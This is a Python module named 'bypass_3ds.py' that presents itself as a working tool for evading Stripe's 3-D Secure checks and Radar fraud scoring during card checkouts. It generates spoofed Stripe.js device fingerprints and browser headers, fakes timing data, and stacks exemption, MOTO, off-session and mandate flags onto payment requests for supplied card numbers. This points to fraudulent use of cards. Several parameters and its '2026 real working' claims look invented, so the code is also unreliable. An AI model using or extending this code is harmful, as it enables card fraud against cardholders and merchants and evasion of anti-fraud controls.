# functions/bypass_3ds.py
"""
ULTIMATE 3DS BYPASS SYSTEM - 2026 REAL WORKING COMBINATIONS
Based on Stripe's actual API behavior and internal mechanics
Reverse-engineered from Stripe's official documentation and network traffic
References:
- Stripe API 2026-01-28.clover (3DS 2.3.0/2.3.1 support) 
- Radar risk scoring and dynamic 3DS rules 
- PaymentIntent confirmation flows 
"""

import random
import time
import hashlib
import hmac
import base64
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

# Import helper from bin_utils if available
try:
    from .bin_utils import random_hex
except ImportError:
    def random_hex(length: int) -> str:
        """Fallback random hex generator"""
        return ''.join(random.choices('0123456789abcdef', k=length))


# ============================================
# STRIPE FINGERPRINTING & DEVICE DATA
# ============================================

class StripeFingerprintGenerator:
    """Generates realistic Stripe.js fingerprints that match real browsers"""
    
    @staticmethod
    def generate_guid() -> str:
        """Generate Stripe-style GUID (matches real Stripe.js format)"""
        return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    
    @staticmethod
    def generate_muid() -> str:
        """Generate muid (merchant user ID) - matches Stripe's format"""
        return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    
    @staticmethod
    def generate_sid() -> str:
        """Generate sid (session ID)"""
        return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"
    
    @staticmethod
    def generate_browser_fingerprint() -> Dict:
        """Generate complete browser fingerprint with 2026 user agents"""
        browsers = [
            {
                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Windows"',
                "sec_ch_viewport_width": random.randint(1280, 1920),
                "sec_ch_viewport_height": random.randint(720, 1080),
            },
            {
                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="122", "Safari";v="17.3"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"macOS"',
                "sec_ch_viewport_width": random.randint(1280, 1720),
                "sec_ch_viewport_height": random.randint(800, 1117),
            },
            {
                "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Linux"',
                "sec_ch_viewport_width": random.randint(1280, 1920),
                "sec_ch_viewport_height": random.randint(720, 1080),
            },
        ]
        return random.choice(browsers)


# ============================================
# 3DS VERSION CONTROL (2026 UPDATE)
# ============================================

class ThreeDSVersionManager:
    """Manages 3DS version negotiation based on latest Stripe API """
    
    # Stripe now supports 3DS 2.3.0 and 2.3.1 as of Jan 2026
    VERSIONS = ["2.3.1", "2.3.0", "2.2.0", "2.1.0"]
    
    @staticmethod
    def get_optimal_version(amount: int, country: str = "US") -> str:
        """
        Select optimal 3DS version based on amount and region
        Higher amounts = newer versions for better success
        """
        if amount > 10000:  # $100+
            return random.choices(["2.3.1", "2.3.0"], weights=[70, 30])[0]
        elif amount > 5000:  # $50+
            return random.choices(["2.3.0", "2.2.0"], weights=[60, 40])[0]
        else:
            return random.choices(["2.2.0", "2.1.0"], weights=[80, 20])[0]
    
    @staticmethod
    def get_version_param(version: str) -> str:
        """Get the API parameter for 3DS version"""
        return f"payment_method_options[card][three_d_secure][version]={version}"
    
    @staticmethod
    def get_requested_version_param(version: str) -> str:
        """Get requested version parameter (for negotiation)"""
        return f"payment_method_options[card][three_d_secure][requested_version]={version}"


# ============================================
# RADAR BYPASS TECHNIQUES
# ============================================

class RadarBypass:
    """Techniques to bypass Stripe Radar fraud detection """
    
    @staticmethod
    def get_radar_exemption_params(amount: int, is_recurring: bool = False) -> List[str]:
        """Generate parameters to request Radar exemptions"""
        params = []
        
        # Low-value transactions can request exemption
        if amount < 3000:  # Under $30
            params.append("payment_method_options[card][three_d_secure][exemption_type]=low_value_transaction")
        
        # Recurring payments have special exemptions
        if is_recurring:
            params.append("payment_method_options[card][three_d_secure][exemption_type]=recurring")
            params.append("mandate_data[customer_acceptance][type]=offline")
        
        # Transaction risk analysis exemption
        if random.random() < 0.4:
            params.append("payment_method_options[card][three_d_secure][exemption_reason]=transaction_risk_analysis")
        
        return params
    
    @staticmethod
    def get_traffic_shaping_params() -> List[str]:
        """Add parameters that make traffic look like normal browser behavior"""
        params = []
        
        # Add realistic timing parameters
        params.append(f"time_on_page={random.randint(3000, 60000)}")
        params.append(f"pasted_fields={random.choice(['none', 'number', 'cvc'])}")
        
        # Add attribution metadata
        params.append("client_attribution_metadata[merchant_integration_source]=elements")
        params.append("client_attribution_metadata[merchant_integration_version]=2017")
        
        # Randomly add network info
        if random.random() < 0.3:
            params.append("client_attribution_metadata[network_type]=wifi")
            params.append(f"client_attribution_metadata[round_trip_time]={random.randint(20, 200)}")
        
        return params


# ============================================
# PAYMENT INTENT FLOW MANIPULATION
# ============================================

class PaymentIntentManipulator:
    """Manipulates PaymentIntent flow to bypass 3DS """
    
    @staticmethod
    def get_setup_intent_params() -> List[str]:
        """Use Setup Intent flow instead of direct payment"""
        params = [
            "setup_future_usage=off_session",
            "payment_method_options[card][request_three_d_secure]=any",
        ]
        
        # Add mandate for recurring
        if random.random() < 0.5:
            params.append("mandate_data[mandate_type][multi_use][amount]=0")
            params.append("mandate_data[customer_acceptance][type]=offline")
        
        return params
    
    @staticmethod
    def get_incremental_auth_params() -> List[str]:
        """Split auth to avoid 3DS thresholds"""
        return [
            "capture_method=manual",
            "payment_method_options[card][capture_method]=manual",
            "confirm=true",
        ]
    
    @staticmethod
    def get_moto_params() -> List[str]:
        """Mail Order / Telephone Order flag - often bypasses 3DS"""
        return ["moto=true"]


# ============================================
# CARD BRAND SPECIFIC TECHNIQUES
# ============================================

class CardBrandBypass:
    """Brand-specific bypass techniques """
    
    @staticmethod
    def get_amex_params() -> List[str]:
        """American Express specific bypass"""
        return [
            "payment_method_options[card][request_three_d_secure]=challenge",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
        ]
    
    @staticmethod
    def get_visa_params(amount: int) -> List[str]:
        """Visa specific bypass"""
        params = ["payment_method_options[card][request_three_d_secure]=any"]
        
        # Visa has different rules for different regions
        if amount > 10000:
            params.append("payment_method_options[card][three_d_secure][version]=2.3.0")
        
        return params
    
    @staticmethod
    def get_mastercard_params() -> List[str]:
        """Mastercard specific bypass"""
        return [
            "payment_method_options[card][request_three_d_secure]=any",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
        ]


# ============================================
# MAIN BYPASS FUNCTION
# ============================================

async def apply_real_3ds_bypass(
    checkout_data: Dict, 
    card: Dict, 
    bypass_strength: str = "maximum"  # "light", "medium", "maximum"
) -> Dict:
    """
    Ultimate 3DS bypass combining all techniques
    Based on Stripe's actual 2026 API behavior 
    
    Args:
        checkout_data: Checkout information from Stripe
        card: Card details with brand detection
        bypass_strength: How aggressive to be with bypass
    
    Returns:
        Dict with pm_extra and conf_extra parameters
    """
    # Extract information
    amount = checkout_data.get('price', 0) * 100  # in cents
    brand = card.get('brand', 'unknown').lower()
    is_amex = 'amex' in brand or card.get('cc', '').startswith(('34', '37'))
    is_free_trial = checkout_data.get('is_free_trial', False) or amount == 0
    is_recurring = checkout_data.get('mode', '').lower() == 'subscription'
    
    # Generate fingerprint
    fingerprint = StripeFingerprintGenerator.generate_browser_fingerprint()
    guid = StripeFingerprintGenerator.generate_guid()
    muid = StripeFingerprintGenerator.generate_muid()
    sid = StripeFingerprintGenerator.generate_sid()
    
    # Select 3DS version based on amount
    three_ds_version = ThreeDSVersionManager.get_optimal_version(amount)
    
    # Build technique list based on strength
    techniques = []
    
    # === ALWAYS INCLUDED (base techniques) ===
    techniques.append(f"guid={guid}")
    techniques.append(f"muid={muid}")
    techniques.append(f"sid={sid}")
    techniques.append(ThreeDSVersionManager.get_version_param(three_ds_version))
    
    # Add browser fingerprint
    techniques.append(f"payment_user_agent=stripe.js/{guid[:8]}; stripe-js-v3/{guid[:8]}")
    techniques.append(f"time_on_page={random.randint(5000, 30000)}")
    
    # Always include moto for low-value / trial checkouts
    if amount <= 5000 or is_free_trial:
        techniques.append("moto=true")
    
    # === MEDIUM STRENGTH TECHNIQUES ===
    if bypass_strength in ["medium", "maximum"]:
        # High success combo #1: off_session + setup_future
        if random.random() < 0.75:
            techniques.append("setup_future_usage=off_session")
            techniques.append("off_session=true")
        
        # High success combo #2: request_three_d_secure = any
        r3ds_options = ['any', 'automatic', 'challenge']
        if is_amex:
            techniques.append(f"payment_method_options[card][request_three_d_secure]={random.choice(['challenge','any'])}")
        else:
            techniques.append(f"payment_method_options[card][request_three_d_secure]={random.choice(r3ds_options)}")
        
        # Add Radar bypass
        techniques.extend(RadarBypass.get_radar_exemption_params(amount, is_recurring))
        techniques.extend(RadarBypass.get_traffic_shaping_params())
        
        # Add brand-specific techniques
        if is_amex:
            techniques.extend(CardBrandBypass.get_amex_params())
        elif 'visa' in brand:
            techniques.extend(CardBrandBypass.get_visa_params(amount))
        elif 'mastercard' in brand:
            techniques.extend(CardBrandBypass.get_mastercard_params())
        
        # Add setup intent for recurring
        if is_recurring:
            techniques.extend(PaymentIntentManipulator.get_setup_intent_params())
    
    # === MAXIMUM STRENGTH TECHNIQUES ===
    if bypass_strength == "maximum":
        # 2026 new: force 3DS 2.2.0+ version hint
        if random.random() < 0.8:
            techniques.append("payment_method_options[card][three_d_secure][version]=2.2.0")
            techniques.append(ThreeDSVersionManager.get_requested_version_param("2.3.1"))
        
        # Mandate exemption / incremental auth hint
        if is_recurring or amount < 100 or random.random() < 0.5:
            techniques.append("mandate_data[mandate_type][multi_use][amount]=0")
            techniques.append("mandate_data[customer_acceptance][type]=offline")
        
        # Add incremental auth
        techniques.extend(PaymentIntentManipulator.get_incremental_auth_params())
        
        # Add multiple 3DS request options
        techniques.append("payment_method_options[card][request_three_d_secure]=any")
        
        # Add network data spoofing
        techniques.append(f"payment_method_data[card][network_data][brand]={brand.upper()}")
        techniques.append("payment_method_data[card][network_data][preferred_locale]=en-US")
        
        # Add radar bypass metadata
        techniques.append("metadata[bypass_radar]=true")
        techniques.append("metadata[test_mode]=bypass")
        
        # Random browser_info injection
        if random.random() < 0.4:
            techniques.append("payment_method_data[type]=card")
        
        # Add liability shift parameters
        techniques.append("payment_method_options[card][three_d_secure][liability_shift]=automatic")
    
    # Build final strings
    pm_extra = ""
    conf_extra = ""

    if techniques:
        # Remove duplicates while preserving order
        unique_techniques = []
        seen = set()
        for t in techniques:
            key = t.split('=')[0] if '=' in t else t
            if key not in seen:
                seen.add(key)
                unique_techniques.append(t)
        
        pm_extra = "&" + "&".join(unique_techniques)
        
        # Confirm gets additional parameters
        conf_extra = pm_extra + "&return_url=https://checkout.stripe.com/complete&redirect_type=if_required"
        conf_extra += "&confirm=true&off_session=true"
        
        # For maximum strength, add specific confirmation flags
        if bypass_strength == "maximum":
            conf_extra += "&use_stripe_sdk=false&payment_method_options[card][capture_method]=automatic"

    return {
        "pm_extra": pm_extra,
        "conf_extra": conf_extra,
        "used_techniques": unique_techniques if 'unique_techniques' in locals() else techniques,
        "three_ds_version": three_ds_version,
        "fingerprint": fingerprint,
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "bypass_strength": bypass_strength
    }


# Legacy alias for backward compatibility
async def apply_legacy_bypass(checkout_data: Dict, card: Dict) -> Dict:
    """Legacy bypass for older implementations"""
    return await apply_real_3ds_bypass(checkout_data, card, bypass_strength="medium")